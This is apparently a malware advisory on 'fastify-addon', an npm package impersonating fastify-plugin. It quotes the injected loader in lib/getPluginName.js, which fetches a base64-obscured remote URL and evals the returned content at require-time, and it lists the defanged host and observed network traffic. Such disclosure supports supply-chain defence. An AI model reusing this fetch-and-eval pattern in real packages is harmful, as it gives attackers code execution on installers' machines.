details: Fastify-addon is a combosquat of the legitimate fastify-plugin package. lib/getPluginName.js contains an injected RCE payload: fetch(atob("[encoded-url-redacted]")).then(r=>r.json()).then(d=>{eval(d.content)}), which base64-decodes to hxxps://www[.]jsonkeeper[.]com/b/UBMJA. The payload fetches a remote JSON blob and evals its content field — full remote code execution at require-time. An HTTPS GET to that URL plus DNS A/AAAA queries were observed. fastify-addon is a combosquat impersonating fastify-plugin with an RCE payload. lib/getPluginName.js calls fetch(atob(...)) decoding to hxxps://www[.]jsonkeeper[.]com/b/UBMJA and evals the response, giving remote code execution at require-time. An HTTPS GET to that URL plus DNS queries and an outbound egress to it were observed.
